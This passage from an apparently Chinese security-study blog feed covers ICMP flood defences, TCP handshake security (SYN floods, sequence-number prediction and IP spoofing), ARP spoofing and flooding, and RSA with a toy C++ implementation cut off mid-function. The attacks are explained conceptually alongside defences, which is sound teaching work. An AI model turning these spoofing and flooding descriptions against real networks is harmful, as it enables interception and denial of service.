alt="ICMP洪泛攻击"></p><p>ICMP洪泛攻击可以具体分为<strong>针对带宽的Dos攻击</strong>和<strong>端口扫描攻击</strong></p><p><strong>针对带宽的Dos攻击：</strong></p><p>攻击者发送大量的伪造的ICMP Echo请求报文，交换机、路由器等网络设备的CPU需要响应这种报文，会占用大量的带宽和CPU，这种Dos攻击和其他Dos攻击一样，消耗设备的资源而使得设备无法提供正常服务。</p><p><strong>端口扫描攻击（针对连接的Dos攻击）：</strong></p><p>端口扫描是指攻击者发送大量的端口扫描报文，交换机需要回应大量的ICMP目的不可达报文，这种攻击既消耗系统的资源，同时攻击者能够很轻易获得设备开启的端口，然后可以针对这些端口进行攻击，可以影响所有IP设备的网络连接。</p><h2 id="六、ICMP攻击防范"><a href="#六、ICMP攻击防范" class="headerlink" title="六、ICMP攻击防范"></a>六、ICMP攻击防范</h2><p>为了减轻设备处理ICMP报文的压力以及防范ICMP攻击，ICMP攻击防范技术尤为重要。目前主要采用<strong>ICMP报文限速</strong>、<strong>ICMP报文合法性检查、丢弃不需要处理的ICMP报文和不响应不可达报文</strong>来防范攻击，保护设备的CPU资源。</p><p><strong>（1）报文限速：</strong>ICMP报文限速包括端口限速、VLAN限速和全局限速，同时也实现芯片的限速，通过多个维度来保证ICMP的洪泛攻击。</p><p><strong>（2）合法性检查&amp;丢弃不需要处理的报文：</strong>对于一些不合法的ICMP报文，比如TTL为0、ICMP类型为15、16、17的报文，都直接丢弃，同时可配置丢弃一些不常用或基本不使用的ICMP报文，包括TTL为1、带选项、不可达的ICMP报文。</p><p><strong>（3）不响应不可达报文：</strong>在用户通过发送大量端口不可达或网络不可达报文攻击设备时，设备收到这些报文后可以不响应，直接丢弃，以保护CPU资源。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>TCP/IP协议栈安全分析--TCP</title>
    <link href="/2023/03/12/TCPIP%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90--TCP/"/>
    <url>/2023/03/12/TCPIP%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90--TCP/</url>
    
    <content type="html"><![CDATA[<h1 id="TCP-IP协议栈安全分析—TCP"><a href="#TCP-IP协议栈安全分析—TCP" class="headerlink" title="TCP/IP协议栈安全分析—TCP"></a>TCP/IP协议栈安全分析—TCP</h1><p>TCP是一种面向连接的协议，它在传输数据之前会建立一条专用的通信连接，意味着在数据传输过程中，两台计算机之间会有一条稳定的数据传输通道。因此，TCP可以保证数据传输的可靠性，但会带来一定的延迟。</p><p><img src="/2023/03/12/TCPIP%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90--TCP/image-20230312110155266.png" alt="总的过程"></p><h2 id="一、三次握手"><a href="#一、三次握手" class="headerlink" title="一、三次握手"></a>一、三次握手</h2><h3 id="1-1-过程分析"><a href="#1-1-过程分析" class="headerlink" title="1.1 过程分析"></a>1.1 过程分析</h3><p><img src="/2023/03/12/TCPIP%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90--TCP/image-20230312111639293.png" alt="三次握手"></p><p>（1）Client端发送一个SYN包，请求连接，告诉Server端他的初始序列号是x，此时Client的状态是SYN_SENT</p><p>（2）Server端收到了SYN包，告诉Client已经收到了请求，并且也告诉Client端自己的序列号是y，发送一个SYN+ACK包，Server的状态是SYN_RCVD</p><p>（3）Client端收到了发送过来的包，发回去一个ACK包，告知Server端已经收到了发送过来的包，此时Client的状态是ESTABLISHED</p><p>（4）Server端收到Client发送过来的ACK包之后，进入ESTABLISHED状态，连接建立完毕</p><p><strong>Q1：为什么需要三次握手？两次行不行？</strong></p><p>三次握手的目的是为了保证Client和server双方的接收能力，发送能力都是正常的。</p><p>第一次握手：Client发送SYN包给Server，Server端收到了，这时候Server端知道：client的发送能力正常，server的接收能力正常</p><p>第二次握手：server发送SYN+ACK包，client收到了，这时候Client端知道：client端的发送，接收能力正常；server端的发送，接收能力正常；但是为什么还需要第三次握手呢？<strong>因为此时client端知道双方均正常，但是server端不知道是否均正常，server只知道自身的发送与接收能力正常，client的发送能力正常，但是他不知道client的接收能力是否正常，所以需要第三次握手client发送一个ACK包，让server知道client接收能力正常，这样就可以建立连接了。</strong></p><p>如果只有两次握手，设想这样一个情境：如果client端发送一个SYN包给server，但是由于种种原因导致SYN包在网络某些结点处滞留了，但是client会进行重传SYN包，然后server端收到了这个重传的包，发送ACK包回去，然后建立好连接。等发送数据完毕之后，连接结束，这时候滞留的SYN包到达了Server端，server以为发起了一个新的连接请求，于是发送回一个ACK包，但是client此时并没有发起连接的请求，所以自动忽略那个ACK包，但是由于前提是两次握手创建连接，只要client收到了ACK包连接就建立了，所以此时连接已经建立了，所以Server端等待client发送数据包，但是client端没有发送数据包的需求，所以资源被浪费。</p><p><strong>Q2：什么是半连接队列？</strong></p><p>服务器第一次收到客户端的 SYN 之后，就会处于 SYN_RCVD 状态，此时双方还没有完全建立其连接，服务器会把此种状态下请求连接放在一个队列里，我们把这种队列称之为半连接队列。当然还有一个全连接队列，就是已经完成三次握手，建立起连接的就会放在全连接队列中。如果队列满了就有可能会出现丢包现象。</p><p><strong>SYN-ACK包重传：</strong>服务器发送完SYN-ACK包，如果未收到客户确认包，服务器进行首次重传，等待一段时间仍未收到客户确认包，进行第二次重传。如果重传次数超过系统规定的最大重传次数，系统将该连接信息从半连接队列中删除。每次重传等待的时间不一定相同，一般会是指数增长，例如间隔时间为 1s，2s，4s，8s…</p><p><strong>Q3：ISN（序列号）是固定的吗</strong></p><p>ISN为了让对方知道如何接下来接收数据的时候如何按序列号组装数据。首先，如果 ISN 是固定的，攻击者很容易猜出后续的确认号，因此 ISN 是动态生成的。其次，如果ISN固定是1，client和server建立好一个TCP连接之后，client连续给server发了10个包，这10个包被链路上的路由器缓存了，这个时候client挂掉了，然后client用同样的端口号重新连接上Server，client又连续给server发了几个包，假设这个时候client的序列号是5了，之前滞留的数据包最终到了server端，server给client回复确认号10，但是client此时自己序列号只有5，这就乱了。。。。。。</p><p><strong>Q4：三次握手可以携带数据吗？</strong></p><p>第三次可以携带数据，但是前两次不行，因为第三次的时候client已经是Establish状态了，所以可以确保双方是可信的，但是如果第一次或者第二次携带数据的话，攻击者完全可以发送恶意的SYN包，包里面有着大量的恶意的数据，server就需要大量的空间、时间来保存这些包</p><h3 id="1-2-安全分析"><a href="#1-2-安全分析" class="headerlink" title="1.2 安全分析"></a>1.2 安全分析</h3><h4 id="1-2-1-SYN洪泛攻击"><a href="#1-2-1-SYN洪泛攻击" class="headerlink" title="1.2.1 SYN洪泛攻击"></a>1.2.1 SYN洪泛攻击</h4><p>SYN攻击就是Client在短时间内伪造大量不存在的IP地址，并向Server不断地发送SYN包，Server则回复确认包，并等待Client确认，由于源地址不存在，因此Server需要不断重发直至超时，这些伪造的SYN包将长时间占用未连接队列，导致正常的SYN请求因为队列满而被丢弃，从而引起网络拥塞甚至系统瘫痪。SYN 攻击是一种典型的 DoS/DDoS 攻击。检测 SYN 攻击非常的方便，当你在服务器上看到大量的半连接状态时，特别是源IP地址是随机的，基本上可以断定这是一次SYN攻击。</p><h4 id="1-2-2-序号攻击"><a href="#1-2-2-序号攻击" class="headerlink" title="1.2.2 序号攻击"></a>1.2.2 序号攻击</h4><p>如果攻击者能够预测目标主机选择的起始序号，他就可能欺骗该目标主机，使其相信它正在与一台可信的主机会话。</p><p><img src="/2023/03/12/TCPIP%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90--TCP/image-20230312115524390.png" alt="IP欺骗"></p><p><strong>Q1：为什么X必须要对B进行Dos攻击？</strong></p><p>如果不做Dos攻击的话，步骤4中B收到A发来的它未请求过的应答包，将返回RST包而终止连接</p><p><strong>Q2：为何X不能直接将自己IP修改为B的IP来连接到A的rlogin端口？</strong></p><p>①相同局域网内IP地址产生冲突</p><p>②外网X不能这样修改，网段不对</p><h3 id="1-3-防御策略"><a href="#1-3-防御策略" class="headerlink" title="1.3 防御策略"></a>1.3 防御策略</h3><h4 id="1-3-1-SYN洪泛攻击防御策略："><a href="#1-3-1-SYN洪泛攻击防御策略：" class="headerlink" title="1.3.1 SYN洪泛攻击防御策略："></a>1.3.1 <strong>SYN洪泛攻击防御策略</strong>：</h4><p><strong>Anti-DDos系统</strong>，部署在网络入口处，在服务器之前处理SYN报文，识别出虚假源，屏蔽来自这些地址的报文，只将合法的SYN报文传递给服务器。主要使用两种手段：源认证和首包丢弃</p><p><strong>源认证：</strong>Anti-DDoS系统拦截客户端发送的SYN报文，代替服务器向客户端发送SYN-ACK报文，如果客户端不应答，则认为该客户端为虚假源；如果客户端应答，则Anti-DDoS系统认为该客户端为真实源，并将其IP地址加入白名单，在一段时间允许该源发送的所有SYN报文通过，也不做代答。</p><p><strong>首包丢弃：</strong>如果Anti-DDoS系统代替服务器应答了所有的SYN Flood攻击报文，那么性能瓶颈仅仅是从服务器转移到了Anti-DDoS系统而已。一旦Anti-DDoS系统的系统资源耗尽，攻击依旧会透传到服务器，而且大量反弹的SYN-ACK报文也会对网络造成一定的压力。所以需要首包丢弃的功能：正常情况下客户端发送SYN报文后如果在一定的时间内没有收到服务器的SYN-ACK应答，客户端会重新发送SYN报文，Anti-DDos系统会丢弃收到的第一个SYN报文，对于SYN洪泛攻击SYN报文绝大多数都是首包，所以只能正常的客户才会进行重传，然后再用源认证，这样一来就可以减少了Anti-DDos系统应答的压力。</p><h4 id="1-3-2-IP欺骗防御策略"><a href="#1-3-2-IP欺骗防御策略" class="headerlink" title="1.3.2 IP欺骗防御策略"></a>1.3.2 IP欺骗防御策略</h4><p>（1）阻止DDos攻击：因为完成IP欺骗必须要有Dos攻击的前提，所以如果可以防止Dos攻击的话，IP欺骗也就无法完成了。</p><p>（2）序列号随机化：攻击者可以猜测出序列号，所以如果序列号能够真正的做到随机化，使得规律无迹可寻。但是在现实生活中，随机很难做到，现在的随机都是伪随机，无法做到真正的随机。</p><h2 id="二、四次挥手"><a href="#二、四次挥手" class="headerlink" title="二、四次挥手"></a>二、四次挥手</h2><p>建立连接需要三次挥手，而终止一个连接需要经过四次挥手。</p><p>刚开始双方均处于ESTABLISHED状态，假设客户端发起关闭请求，过程如下：</p><p><img src="/2023/03/12/TCPIP%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90--TCP/image-20230312122548799.png" alt="四次挥手"></p><p><strong>第一次挥手</strong>：client发送FIN报文，报文中指定一个序列号u，此时客户端处于FIN_WAIT1状态，等待服务端确认</p><p><strong>第二次挥手：</strong>服务端收到FIN之后，会发送ACK报文，且把客户端的u+1作为ACK报文的序列号值，表明已经收到客户端的报文了，此时服务端处于CLOSE_WAIT状态，此时TCP处于半关闭状态，客户端到服务端的连接释放，客户端收到服务端的确认后，进入FIN_WAIT2状态，等待服务端发出的连接释放报文段</p><p><strong>第三次挥手：</strong>server端也进行断开，发送FIN报文，且指定一个序列号，此时server端处于LAST_ACK状态。即服务端没有要向客户端发出的数据，等待client确认。</p><p><strong>第四次挥手：</strong>client收到FIN之后，一样发出一个ACK报文作为应答，且把server的序列号值+1作为自己ACK报文的序列值，此时客户端处于TIME_WAIT状态。需要过一阵子以确保服务端收到自己的ACK报文之后才会进入CLOSED状态，Server端收到ACK报文之后，就处于关闭连接了，处于CLOSED状态。</p><p><strong>Q1：挥手为什么需要四次？</strong></p><p>因为当服务端收到客户端的SYN连接请求报文后，可以直接发送<strong>SYN+ACK</strong>报文。其中ACK报文是用来应答的，SYN报文是用来同步的。但是关闭连接时，当服务端收到<strong>FIN</strong>报文时，很可能并不会立即关闭SOCKET，所以只能先回复一个ACK报文，告诉客户端，“你发的FIN报文我收到了”。只有等到我服务端所有的报文都发送完了，我才能发送FIN报文，因此不能一起发送。故需要四次挥手。</p><p><strong>Q2：2MSL等待状态的意义</strong></p><p>MSL是指任何报文在网络上存在的最长时间，超过这个时间报文将被丢弃。</p><p>为了保证客户端发送的最后一个ACK报文段能够到达服务器。因为这个ACK有可能丢失，从而导致处在LAST-ACK状态的服务器收不到对FIN-ACK的确认报文。server会超时重传这个FIN-ACK，接着client再重传一次确认，重新启动时间等待计时器，最后客户端和服务端都能正常的关闭。假设客户端不等待2MSL的话，发送完ACK之后就直接关闭，一旦ACK丢失的话，server将无法正常的进入关闭连接状态。</p><p>简而言之：</p><p>（1）保证客户端发送最后的一个ACK报文段可以到达服务端</p><p>（2）防止“已失效的连接请求报文段”出现在本连接中：经过2MSL之后，就可以使本连接持续的时间内所产生的所有报文段都从网络中消失，使下一个新的连接不会出现旧的连接请求报文段。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>TCP/IP协议栈安全分析--ARP</title>
    <link href="/2023/03/09/TCPIP%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90--ARP/"/>
    <url>/2023/03/09/TCPIP%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90--ARP/</url>
    
    <content type="html"><![CDATA[<h1 id="TCP-IP协议栈安全分析—ARP"><a href="#TCP-IP协议栈安全分析—ARP" class="headerlink" title="TCP/IP协议栈安全分析—ARP"></a>TCP/IP协议栈安全分析—ARP</h1><h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>地址解析协议，即ARP（Address Resolution Protocol），是根据IP地址获取物理地址的一个TCP/IP协议。</p><p>主机发送信息时将包含目标IP地址的ARP请求广播到局域网络上的所有主机，并接收返回消息，以此确定目标的物理地址。</p><p>收到返回消息后将该IP地址和物理地址存入本机ARP缓存中并保留一定时间，下次请求时直接查询ARP缓存以节约资源。</p><p>地址解析协议是建立在网络中各个主机互相信任的基础上的，局域网络上的主机可以自主发送ARP应答消息，其他主机收到应答报文时不会检测该报文的真实性就会将其记入本机ARP缓存。</p><p>简单一点说就是：在IP以太网中，当一个上层协议要发包的时候，有了该节点的IP地址，ARP就能提供该节点的MAC地址</p><h2 id="二、ARP工作过程"><a href="#二、ARP工作过程" class="headerlink" title="二、ARP工作过程"></a>二、ARP工作过程</h2><p>（1）主机A和主机B在一个网段里面</p><ol><li>主机A首先查看自己的ARP缓存表，确定其中是否包含有主机B对应的ARP表项。如果找到了对应的MAC地址，则主机A直接利用ARP表中的MAC地址，对IP数据包进行帧封装，并将数据包发送给主机B。</li><li>如果在ARP缓存表里面找不到相对应的表项，就缓存该数据报文，然后以广播的方式发送一个ARP请求报文。ARP请求报文中的发送端IP地址和发送端MAC地址为主机A的IP地址和MAC地址，目标IP地址和目标MAC地址为主机B的IP地址和全0的MAC地址。由于ARP请求报文以广播方式发送，该网段上的所有主机都可以接收到该请求，但只有被请求的主机（即主机B）会对该请求进行处理。</li><li>主机B比较自己的IP地址和ARP请求报文中的目标IP地址，当两者相同时进行如下处理：将ARP请求报文中的发送端（即主机A）的IP地址和MAC地址存入自己的ARP表中。之后以单播方式发送ARP响应报文给主机A，其中包含了自己的MAC地址。</li><li>主机A收到ARP响应报文后，将主机B的MAC地址加入到自己的ARP表中以用于后续报文的转发，同时将IP数据包进行封装后发送出去。</li></ol><p>（2）主机A和主机B不在一个网段里面（<strong>在不在同一个网段里面由主机A进行判断</strong>）</p><ol><li>主机A就会先向网关发出ARP请求，ARP请求报文中的目标IP地址为网关的IP地址。</li><li>当主机A从收到的响应报文中获得网关的MAC地址后，将报文封装并发给网关。</li><li>如果网关没有主机B的ARP表项，网关会广播ARP请求，目标IP地址为主机B的IP地址，当网关从收到的响应报文中获得主机B的MAC地址后，就可以将报文发给主机B。</li><li>如果网关已经有主机B的ARP表项，网关直接把报文发给主机B。</li></ol><h2 id="三、ARP表"><a href="#三、ARP表" class="headerlink" title="三、ARP表"></a>三、ARP表</h2><p>网络设备一般都有一个ARP缓存（ARP Cache），ARP缓存用来存放IP地址和MAC地址的关联信息。在发送数据前，设备会先查找ARP缓存表。如果缓存表中存在对方设备的MAC地址，则直接采用该MAC地址来封装帧，然后将帧发送出去。如果缓存表中不存在相应的信息，则通过发送ARP request报文来获得它。学习到的IP地址和MAC地址的映射关系会被放入ARP缓存表中存放一段时间。在有效期内，设备可以直接从这个表中查找目的MAC地址来进行数据封装，而无需进行ARP查询。过了这段有效期，ARP表现会被自动删除。如果目标设备位于其他网络则源设备会在ARP缓存表中查找网关的MAC地址，然后将数据发送给网关，网关再把数据转发给目的设备。</p><p>ARP表项又分为动态ARP表项和静态ARP表项。</p><h3 id="3-1-动态ARP表项"><a href="#3-1-动态ARP表项" class="headerlink" title="3.1 动态ARP表项"></a>3.1 动态ARP表项</h3><p>动态ARP表项由ARP协议通过ARP报文自动生成和维护，可以被老化，可以被新的ARP报文更新，可以被静态ARP表项覆盖。每个动态ARP缓存项的潜在生命周期是10分钟。新加到缓存中的项目带有时间戳，如果某个项目添加后2分钟内没有再使用，则此项目过期并从ARP缓存中删除；如果某个项目已在使用，则又收到2分钟的生命周期；如果某个项目始终在使用，则会另外收到2分钟的生命周期，一直到10分钟的最长生命周期。</p><h3 id="3-2-静态ARP表项"><a href="#3-2-静态ARP表项" class="headerlink" title="3.2 静态ARP表项"></a>3.2 静态ARP表项</h3><p>静态ARP表项通过手工配置和维护，不会被老化，不会被动态ARP表项覆盖，直到重新启动计算机为止。</p><p>配置静态ARP表项可以增加通信的安全性。静态ARP表项可以限制和指定IP地址的设备通信时只使用指定的MAC地址，此时攻击报文无法修改此表项的IP地址和MAC地址的映射关系，从而保护了本设备和指定设备间的正常通信。</p><h2 id="四、ARP欺骗"><a href="#四、ARP欺骗" class="headerlink" title="四、ARP欺骗"></a>四、ARP欺骗</h2><p>因为ARP请求是基于互相信任的基础之上的，所以说无论是谁发的，我都会选择无条件相信。</p><p>如果一台不可信赖的计算机发出假冒的ARP查询或应答信息，并将所有流向它的数据流转移。这样，它就可以伪装成某台机器或修改数据流。这种攻击叫做<strong>ARP攻击</strong>，比如黑客软件Arpspoof就可以实现这样的攻击。</p><h3 id="4-1-ARP欺骗—假冒网关"><a href="#4-1-ARP欺骗—假冒网关" class="headerlink" title="4.1 ARP欺骗—假冒网关"></a>4.1 ARP欺骗—假冒网关</h3><p><img src="/2023/03/09/TCPIP%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90--ARP/image-20230309202825792.png" alt="假冒网关"></p><p>攻击者监听到洪泛的ARP Request后，广播假的网关ARP Reply报文给同网段主机。</p><p>如上图</p><p>攻击者B假冒网关，说目的IP 1.1.1.1对应的MAC地址为B，与之相邻的主机的ARP表均被污染，这样的话如果用户A想要上网，发送IP包给网关，但是由于ARP表已经被污染了，IP地址为1.1.1.1的主机的MAC地址为B，所以用户A的上网流量被导向到攻击者B，如此一来便上不了网了</p><h3 id="4-2-ARP-欺骗—欺骗网关"><a href="#4-2-ARP-欺骗—欺骗网关" class="headerlink" title="4.2 ARP 欺骗—欺骗网关"></a>4.2 ARP 欺骗—欺骗网关</h3><p><img src="/2023/03/09/TCPIP%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90--ARP/image-20230310075203443.png" alt="欺骗网关"></p><p>攻击者B发送伪造的ARP Request报文，说IP地址为1.1.1.3的MAC地址是B，然后网关的ARP表被污染掉，这样用户A想要上网，包可以发送到网关处，但是网关这里无法将发送给用户A的流量发送给A，因为ARP表已经被污染了，所以说网关原本发送给用户A的流量被发送到了攻击者B</p><h3 id="4-3-ARP欺骗—欺骗终端用户"><a href="#4-3-ARP欺骗—欺骗终端用户" class="headerlink" title="4.3 ARP欺骗—欺骗终端用户"></a>4.3 ARP欺骗—欺骗终端用户</h3><p><img src="/2023/03/09/TCPIP%E5%8D%8F%E8%AE%AE%E6%A0%88%E5%AE%89%E5%85%A8%E5%88%86%E6%9E%90--ARP/image-20230310075821109.png" alt="欺骗终端用户"></p><p>攻击者B发送伪造的ARP Request报文，说IP地址为1.1.1.9的MAC地址为B，用户A的ARP表被污染了，导致用户A原本发送给用户C的包会发送到攻击者B</p><p>上面发送的ARP Request报文是广播的，所以说在一个网段里面，所有的主机的ARP表都将会被污染</p><p>比如第三张图片中，其实网关、用户C的ARP表也被污染了，所以其实用户C也无法上网，分析过程也是从IP—&gt;MAC的映射关系入手。</p><p>在攻击者B广播伪造的ARP Request报文的时候，网关的ARP表中1.1.1.9对应的MAC地址也被修改为了B，当用户C想要上网的时候，用户C向网关发送数据包，这一步仍然可以正常进行，因为在用户C的ARP表中网关的IP与MAC地址并没有被修改，但是当网关想要把返回来的数据包发送给用户C的时候，由于网关的ARP表被修改了，所以网关想要发回用户C的数据包最终会发给攻击者B</p><h2 id="五、ARP防御"><a href="#五、ARP防御" class="headerlink" title="五、ARP防御"></a>五、ARP防御</h2><h3 id="5-1-网关防御"><a href="#5-1-网关防御" class="headerlink" title="5.1 网关防御"></a>5.1 网关防御</h3><p>（1）合法ARP绑定，防御网关被欺骗</p><p>（2）VLAN内的ARP学习数量限制，防御ARP泛洪攻击</p><h3 id="5-2-接入设备防御"><a href="#5-2-接入设备防御" class="headerlink" title="5.2 接入设备防御"></a>5.2 接入设备防御</h3><p>（1）将合法网关IP-MAC进行绑定，防御仿冒网关攻击</p><p>（2）ARP入侵检测</p><p>（3）ARP限速，防止大流量ARP报文冲击网络</p><p>（4）绑定用户的静态MAC</p><h3 id="5-3-客户端防御"><a href="#5-3-客户端防御" class="headerlink" title="5.3 客户端防御"></a>5.3 客户端防御</h3><p>（1）合法网关ARP绑定，防止网关仿冒攻击</p><p>（2）绑定该主机的合法IP-MAC，过滤掉所有非法ARP报文</p><p>（3）ARP限速</p><blockquote><p>没有到老化时间不允许修改MAC地址</p><p>对于MAC地址要修改的ARP报文，对原ARP表对应的用户发送单播确认；收到应答进行拒绝</p><p>合法ARP静态绑定；ARP限速，防止ARP Flooding</p></blockquote><h2 id="六、补充：ARP-Flooding攻击"><a href="#六、补充：ARP-Flooding攻击" class="headerlink" title="六、补充：ARP Flooding攻击"></a>六、补充：ARP Flooding攻击</h2><p><strong>ARP Flooding攻击</strong>：攻击者向设备发送大量目的IP地址无法解析的伪造ARP请求或免费报文，造成设备上的ARP表项溢出。无法缓存正常用户的ARP表项，从而影响正常的报文转发。</p><p><strong>如何防御ARP Flooding攻击？</strong></p><p>（1）<code>禁止接口学习ARP表项的功能</code>：用户禁止指定接口学习ARPP表项的功能，可以有效防止ARP表项溢出，保证ARP表项的安全性。</p><p>（2）<code>配置ARP表项严格学习</code>：设备仅学习自己发送的ARP请求报文的应答报文，并不学习其他设备向路由器发送的ARP请求报文。</p><p>（3）<code>配置ARP表项限制</code>：设备基于接口限制学习ARP表项的总数目，可以有效的防止ARP表项溢出，保证安全性。</p><p>（4）<code>配置ARP报文限速</code>：设备对ARP报文进行数量统计，在一定时间内，如果ARP报文数量超过了配置的阈值，超出部分的ARP报文将被忽略，设备不做任何处理，有效防止ARP表项溢出</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>RSA算法</title>
    <link href="/2023/03/09/RSA%E7%AE%97%E6%B3%95/"/>
    <url>/2023/03/09/RSA%E7%AE%97%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<h1 id="RSA算法"><a href="#RSA算法" class="headerlink" title="RSA算法"></a>RSA算法</h1><h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>RSA是一种非对称加密算法，是由罗纳德·李维斯特（Ron Rivest）、阿迪·萨莫尔（Adi Shamir）和伦纳德·阿德曼（Leonard Adleman）在1977年一起提出的。RSA就是他们三位的姓名的首字母。</p><p>非对称加密算法：加密与解密的密钥不同</p><p>RSA同时还是分组加密算法，<strong>分组大小可以根据密钥的大小而改变</strong>，如果加密的数据不是分组大小的整数倍，则会根据具体的应用方式增加额外的填充位。</p><p><strong>RSA算法的原理围绕着模幂运算</strong>，<strong>模幂运算就是计算a^b^mod n的过程</strong></p><h2 id="二、计算公钥与私钥"><a href="#二、计算公钥与私钥" class="headerlink" title="二、计算公钥与私钥"></a>二、计算公钥与私钥</h2><p>公钥用于加密，私钥进行解密</p><p>（1）首先选择两个大素数，记作p和q，这两个数至少得有200位，才能在实践中保证相对的安全</p><p>（2）计算n=p*q，随机选择加密密钥e，保证e和(p-1)(q-1)互素</p><p>（3）使用扩展欧几里德算法，<em>ed</em> = 1mod (<em>p</em> - 1)(<em>q</em> - 1)，d和e的关系是互为逆元</p><p>（4）公钥为(<em>e</em>, <em>n</em>)，私钥为(<em>d</em>, <em>n</em>)</p><p>我们表示<strong>P = (e,n) , S = (d,n)</strong></p><p>用P来加密数据，用S来解密。<strong>为了防止就算有人知道了P也无法推算出S，必须保证p和q的值绝对不能暴露</strong>。</p><p>此项难题来自于<strong>大整数分解难题</strong>：给你两个整数，很容易可以知道整数之积；但是如果给你一个大整数，很难确定是由哪两个素整数之积</p><p>所以用此项难题来保证加密解密的安全性</p><h2 id="三、加密解密的合理性"><a href="#三、加密解密的合理性" class="headerlink" title="三、加密解密的合理性"></a>三、加密解密的合理性</h2><p><img src="/2023/03/09/RSA%E7%AE%97%E6%B3%95/image-20230309154824728.png" alt="image-20230309154824728"></p><h2 id="四、加密解密数据分组"><a href="#四、加密解密数据分组" class="headerlink" title="四、加密解密数据分组"></a>四、加密解密数据分组</h2><p><img src="/2023/03/09/RSA%E7%AE%97%E6%B3%95/image-20230309154845590.png" alt="image-20230309154845590"></p><h2 id="五、算法实现"><a href="#五、算法实现" class="headerlink" title="五、算法实现"></a>五、算法实现</h2><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">//本算法实现是相当简单的版本</span><br><span class="hljs-comment">//仅体现过程，不追求效率</span><br><span class="hljs-comment">//在实际生产过程中绝无可能使用如下算法</span><br><span class="hljs-comment">//仅作学习记录</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;algorithm&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;math.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-comment">//一个非常简单的RSA算法实现，只追求完整步骤，不讲究效率</span><br><br><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">Isprime</span><span class="hljs-params">(<span class="hljs-type">int</span> p)</span> </span>&#123;<br>    <span class="hljs-comment">//是否是素数，最原始方法，不讲究效率</span><br>    <span class="hljs-type">bool</span> ans=<span class="hljs-literal">true</span>;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">2</span>; i &lt;= <span class="hljs-built_in">sqrt</span>(p); i++) &#123;<br>        <span class="hljs-keyword">if</span> (p % i == <span class="hljs-number">0</span>) &#123;<br>            ans = <span class="hljs-literal">false</span>;<br>      